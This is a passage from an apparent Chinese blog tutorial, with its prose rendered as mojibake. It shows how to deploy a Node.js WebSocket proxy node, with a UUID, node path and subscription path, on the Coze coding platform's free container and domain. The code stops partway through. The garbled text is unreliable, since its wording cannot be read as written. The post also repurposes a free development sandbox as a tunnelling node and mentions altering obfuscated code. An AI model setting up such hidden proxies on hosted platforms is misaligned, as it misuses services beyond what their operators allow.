&lt;p&gt;æœ¬è´¨æ˜¯ç«å±±å¼•æ“æ——ä¸‹çš„ä¸œè¥¿ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œè€Œä¸”å§ï¼Œæ¯”è¾ƒæœ‰æ„æ€ï¼Œè·Ÿ claude å’Œ codex å·®ä¸å¤š&lt;/p&gt;
&lt;p&gt;åŸºæœ¬æ˜¯ï¼šè®²è¿°å¼ç¼–ç¨‹æ–¹å¼ï¼Œä¸€å¤©æ™ºèƒ½å»º3ä¸ªé¡¹ç›®ï¼Œä¸€ä¸ªé¡¹ç›®æ˜¯1cpuï¼Œ2Gå†…å­˜&lt;/p&gt;
&lt;p&gt;æ‰“å¼€ç½‘ç«™ï¼Œæ–°å»ºé¡¹ç›®ï¼Œç„¶åç‚¹å‡»ç½‘é¡µåº”ç”¨ï¼Œä¸‹é¢çš„æ–‡æœ¬è¾“å…¥æ¡†å°±æ˜¯ç¼–ç¨‹çš„åœ°æ–¹äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260109143051207&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-coze_program/image-20260109143051207.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆè®©å®ƒè‡ªå·±ç”Ÿæˆä¸€ä¸ªåº”ç”¨ï¼Œå†åœ¨ç”Ÿæˆçš„åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ï¼Œç›´æ¥ç¡¬æ¥ä¼šæœ‰æ— ç©·çš„éº»çƒ¦ï¼Œå®ƒæœ‰è‡ªå·±å›ºå®šçš„æ¶æ„&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å»ºç«‹ä¸€ä¸ªæç®€çš„nodejsç¨‹åºï¼Œä¸ä¾èµ–ä»»ä½•å‰ç«¯å’Œåç«¯æ¡†æ¶ï¼Œä¸è¦ç”¨åˆ°nextæ¡†æ¶ã€‚å‰ç«¯é¡µé¢æ˜¯index.htmlï¼Œé‡Œé¢æ˜¯Hello worldï¼Œä¸»ç¨‹åºæ˜¯index.jsï¼Œç”¨æ¥æ˜¾ç¤ºindex.htmlçš„å†…å®¹ï¼Œç»å¯¹ä¸è¦ç”¨åˆ°ä»»ä½•jsæ¡†æ¶ã€‚
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-coze_program/image-20260110084728806.png&#34;&gt;ç„¶åç³»ç»Ÿå°±å½é‡Œå‘±å•¦ã€å“”å“”èµ–èµ–å¼€å§‹è‡ªå·±æäº†ï¼Œå®ƒç¼ºçœåˆ›ç«‹çš„é¡¹ç›®æ— è®ºä½ å†æ€ä¹ˆå¼ºè°ƒï¼Œéƒ½æ˜¯åŸºäºnext.jsçš„ï¼Œéƒ½ä¼šæ‹‰å‡ºä¸€å¨nextçš„å±ï¼Œæ‰€ä»¥ä¼šç¥ç»å…®å…®çš„æ€è€ƒæ¥æ€è€ƒå»ï¼Œäº§ç”Ÿä¸€å †åºŸç‰©ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç”¨ç†ä»–&lt;/p&gt;
&lt;p&gt;ç„¶åæ˜¾ç¤ºæ­£å¸¸&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260110084959917&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-coze_program/image-20260110084959917.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ä»ä¸Šå›¾æˆ‘ä»¬å¾—åˆ°å‡ ä¸ªå…³é”®ä¿¡æ¯ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç«¯å£æ˜¯5000&lt;/li&gt;
&lt;li&gt;æ–‡ä»¶å¤¹å¯ä»¥çœ‹åˆ°æ–‡ä»¶ï¼Œé‡Œé¢æœ‰ä¸€å †ç¼ºçœçš„é…ç½®ï¼Œå°±ç®—å¼ºè°ƒï¼Œä¾ç„¶æœ‰nextæ‹‰çš„å±&lt;/li&gt;
&lt;li&gt;éƒ¨ç½²æŒ‰é’®ï¼Œæˆ‘ä»¬éƒ¨ç½²æµ‹è¯•ä¸€ä¸‹&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æŒ‰éƒ¨ç½²æŒ‰é’®ï¼Œä¼šå¾—åˆ°ä¸€ä¸ªåŸŸå&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260110085206303&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-coze_program/image-20260110085206303.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åéƒ¨ç½²æˆåŠŸï¼Œç‚¹å‡»ç®­å¤´&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260110085256978&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-coze_program/image-20260110085256978.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‰“å¼€åï¼Œå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20260110085334086&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-coze_program/image-20260110085334086.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è®°ä¸‹æ¥è¿™ä¸ª&lt;strong&gt;åŸŸå&lt;/strong&gt;ï¼Œå¤§å–„äººå•Šï¼Œå…è´¹åŸŸåå’Œå…è´¹è¯ä¹¦&lt;/p&gt;
&lt;p&gt;ç„¶åå›åˆ°æ–‡ä»¶å¤¹ï¼Œæ¥ä¿®æ”¹ä¸‰ä¸ªæ–‡ä»¶ï¼Œindex.html å’Œ index.js å’Œ package.json&lt;/p&gt;
&lt;p&gt;å…ˆæ¥æ”¹ package.json, åœ¨dependenciesä¸­ï¼ŒåŠ ä¸¤å¥ï¼Œæ³¨æ„è¿™ä¸¤å¥çš„ä¸Šä¸€å¥éœ€è¦åŠ ä¸ªé€—å·ï¼Œaxiosæœ€åæ²¡æœ‰é€—å·&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;ws&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;^8.14.2&amp;#34;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;s2&#34;&gt;&amp;#34;axios&amp;#34;&lt;/span&gt;: &lt;span class=&#34;s2&#34;&gt;&amp;#34;^1.12.2&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img alt=&#34;image-20260110085727823&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20260109-coze_program/image-20260110085727823.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ³¨æ„ï¼šå†™åˆ°æœ€åï¼Œå‘ç°è¿™é‡Œå¯ä»¥å†éƒ¨ç½²ä¸€ä¸‹å†æ”¹index.jspå’Œindex.htmlæ¯”è¾ƒå¥½ï¼Œå°±ä¸ç”¨ç»å†æˆ‘ä¸‹é¢çš„å›æ¡£äº†ï¼ï¼ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;æˆ‘ä¸‹é¢æ˜¯æ²¡æœ‰å†éƒ¨ç½²ï¼Œç›´æ¥ç¡¬æ”¹ï¼Œç‚¹å¼€æ–‡ä»¶å¤¹å›¾æ ‡ï¼Œé€‰ä¸­index.jsï¼Œå…ˆåˆ«è´´ï¼Œéœ€è¦ä¿®æ”¹æ··æ·†çš„ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;http&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;http&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;https&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;fs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;dns&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;dns&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;axios&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;axios&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;net&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;path&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;crypto&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;crypto&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; Buffer &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;buffer&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt; WebSocket, createWebSocketStream &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ws&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;// ç”Ÿæˆ UUID v4
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; generateUUID&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; crypto.randomUUID&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.UUID &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; generateUUID&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;DOMAIN&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.DOMAIN &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;xxxxxxxx.coze.site&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; // å¡«å†™é¡¹ç›®åŸŸå
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;WSPATH&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.WSPATH &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; UUID.slice&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0, 8&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;     // èŠ‚ç‚¹è·¯å¾„ï¼Œé»˜è®¤è·å–uuidå‰8ä½
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;SUB_PATH&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.SUB_PATH &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;sub&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;            // èŠ‚ç‚¹çš„è®¢é˜…è·¯å¾„
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;NAME&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.NAME &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                       // èŠ‚ç‚¹åç§°
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;PORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.PORT &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; 5000&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                     // httpå’ŒwsæœåŠ¡ç«¯å£
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;TLS_KEY_PATH&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.TLS_KEY_PATH &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;TLS_CERT_PATH&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; process.env.TLS_CERT_PATH &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;ISP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;const &lt;span class=&#34;nv&#34;&gt;GetISP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; async &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  try &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; await axios.get&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;https://api.ip.sb/geoip&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    const &lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; res.data&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;ISP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.country_code&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;-&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.isp&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;`&lt;/span&gt;.replace&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/ /g, &lt;span class=&#34;s1&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; catch &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;e&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;ISP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Unknown&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GetISP&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; normalizeSecret&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;value&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!value&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; value.includes&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ? value.replace&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;/&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;n/g, &lt;span class=&#34;s1&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; : value&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; readOptionalFile&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;filePath&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;!filePath&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  const &lt;span class=&#34;nv&#34;&gt;resolvedPath&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; path.isAbsolute&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;filePath&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; ? filePath : path.join&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;__dirname, filePath&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  try &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; fs.readFileSync&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;resolvedPath, &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; catch &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;error&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
